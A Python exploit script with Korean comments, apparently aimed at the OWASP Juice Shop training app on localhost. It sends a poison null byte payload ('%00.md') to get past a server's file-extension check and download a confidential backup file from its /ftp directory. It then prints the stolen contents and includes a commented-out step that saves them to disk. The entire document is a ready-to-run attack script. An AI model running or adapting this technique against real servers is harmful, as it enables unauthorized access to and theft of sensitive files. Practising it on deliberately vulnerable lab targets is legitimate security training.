import requests

# 타겟 주스샵 서버 주소 (실행 환경에 맞게 IP나 포트를 수정하세요)
BASE_URL = "http://localhost:3000"

def exploit_sensitive_data():
    print("[*] 포이즌 널 바이트(Poison Null Byte)를 이용한 자동화 익스플로잇 시작...\n")

    # 1. 타겟 디렉터리 및 탈취할 기밀 파일 지정
    target_path = "/ftp/incident-support.bak"

    # 2. 서버의 파일 확장자 검증 로직(.md 파일만 허용)을 우회하기 위한 페이로드
    bypass_payload = "%00.md"

    # 최종 익스플로잇 URL 조합
    exploit_url = f"{BASE_URL}{target_path}{bypass_payload}"
    print(f"[*] 페이로드 전송: {exploit_url}")

    try:
        # GET 요청으로 파일 다운로드 시도
        response = requests.get(exploit_url)

        # HTTP 응답 코드가 200(OK)일 경우 탈취 성공
        if response.status_code == 200:
            print("[+] 공격 성공! 서버의 민감한 데이터가 노출되었습니다.\n")

            # 파일의 첫 300자만 잘라서 화면에 출력 (확인용)
            print("-" * 50)
            print(response.text[:300])
            print("\n[...] (데이터 생략) ...")
            print("-" * 50)

            # 필요하다면 파일로 저장하는 로직을 여기에 추가할 수 있습니다.
            # with open("stolen_backup.bak", "w", encoding="utf-8") as f:
            #     f.write(response.text)

        elif response.status_code == 403:
            print("[-] 공격 실패 (HTTP 403): 서버가 페이로드를 차단했습니다. 룰이 업데이트되었을 수 있습니다.")
        else:
            print(f"[-] 접근 실패. HTTP 상태 코드: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[!] 네트워크 연결 오류 발생: {e}")

if __name__ == "__main__":
    exploit_sensitive_data()